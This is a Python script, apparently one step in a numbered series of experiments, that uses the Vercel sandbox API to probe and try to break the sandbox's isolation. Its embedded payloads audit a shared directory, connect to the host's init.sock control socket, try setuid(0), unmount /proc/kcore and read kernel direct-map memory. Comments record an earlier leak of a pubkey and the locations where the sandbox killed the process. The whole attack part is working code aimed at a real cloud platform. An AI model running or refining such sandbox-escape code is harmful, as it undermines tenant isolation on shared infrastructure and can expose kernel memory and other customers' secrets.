# 实验J177: 网络策略验证 + init.sock控制面通道 + direct map被杀点精确定位
# j176: PA1 socket(网络策略违规?)被杀 / PA2 sandbox-init泄露pubkey+init.sock / PB direct map 64MB被杀
# 本步: 1)不带networkPolicy建沙箱(默认出站) 验证socket是否放行
#       2)/run/vercel/share/ 目录审计 + AF_UNIX连init.sock(只connect+read, 不发送)
#       3)kcore 1MB chunk扫描: 先text段(对照)后direct map, 每chunk checkpoint定位被杀点
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=8000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj177"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
# 不带 networkPolicy -> 默认策略
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# PA: share目录审计 + AF_UNIX init.sock 只读探测 + 单次TCP 127.0.0.1 探测
PA = r'''
import os, socket
out = open("/tmp/d177a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
# 1. share 目录审计
try:
    for fn in sorted(os.listdir("/run/vercel/share")):
        fp = "/run/vercel/share/" + fn
        st = os.lstat(fp)
        p("SHARE", fn, oct(st.st_mode), "size", st.st_size, "uid", st.st_uid)
except Exception as ex:
    p("share_err", repr(ex))
# 2. AF_UNIX init.sock: connect + 只读(非阻塞读)
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect("/run/vercel/share/init.sock")
    p("UNIX_CONNECTED")
    try:
        d = s.recv(1024)
        p("UNIX_RECV", d[:200])
    except socket.timeout:
        p("UNIX_RECV_TIMEOUT")
    except Exception as ex:
        p("UNIX_RECV_EXC", repr(ex))
    s.close()
except Exception as ex:
    p("UNIX_EXC", repr(ex))
# 3. 单次 TCP 127.0.0.1:30001 (对比: 网络策略是否导致被杀)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect(("127.0.0.1", 30001))
    p("TCP_CONNECTED")
    s.close()
except Exception as ex:
    p("TCP_EXC", repr(ex))
p("done")
out.close()
'''

# PB: kcore 扫描 - 先 text 段(对照) 后 direct map, 1MB chunk 每chunk checkpoint
PB = r'''
import os, ctypes, struct
out = open("/tmp/d177b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
if os.getuid() != 0:
    libc.setuid(0)
libc.umount(b"/proc/kcore")
fd = os.open("/proc/kcore", os.O_RDONLY)
def rd_at(off, n):
    pos = os.lseek(fd, off, 0)
    if pos != off:
        return b""
    return os.read(fd, n)

head = rd_at(0, 64)
e_phoff = struct.unpack("<Q", head[32:40])[0]
e_phentsize = struct.unpack("<H", head[54:56])[0]
e_phnum = struct.unpack("<H", head[56:58])[0]
segs = []
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    h = rd_at(off, 56)
    if len(h) < 56:
        break
    p_type = struct.unpack("<I", h[0:4])[0]
    if p_type != 1:
        continue
    p_offset = struct.unpack("<Q", h[8:16])[0]
    p_vaddr = struct.unpack("<Q", h[16:24])[0]
    p_filesz = struct.unpack("<Q", h[32:40])[0]
    segs.append((p_offset, p_vaddr, p_filesz))
p("segs", len(segs))

# 对照: text 段 (j175 成功扫过) - 只扫前 32MB
t0 = segs[0][0]
n = 0
pos = 0
while pos < 32 * 1024 * 1024:
    d = rd_at(t0 + pos, 1024 * 1024)
    if not d:
        p("TEXT_EMPTY", hex(segs[0][1] + pos))
        break
    n += len(d)
    pos += len(d)
p("TEXT_SCANNED", n)

# direct map: 1MB chunk 每chunk checkpoint
for si, (off0, vaddr, fsz) in enumerate(segs):
    if not (0xffff888000000000 <= vaddr < 0xffff889000000000):
        continue
    p("SCANSEG", si, hex(vaddr), hex(fsz))
    pos = 0
    while pos < fsz:
        try:
            d = rd_at(off0 + pos, 1024 * 1024)
        except Exception as ex:
            p("READ_EXC", hex(vaddr + pos), repr(ex))
            break
        if not d:
            p("READ_EMPTY", hex(vaddr + pos))
            break
        pos += len(d)
        if pos % (16 * 1024 * 1024) == 0:
            p("CKPT", hex(vaddr + pos))
        out.flush()
    break  # 只扫第一个 direct map 段
p("done")
os.close(fd)
p("=== B_DONE")
out.close()
'''

steps = [
    ("share-sock", "/tmp/d177a.txt", PA),
    ("kcore-ckpt", "/tmp/d177b.txt", PB),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 8000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
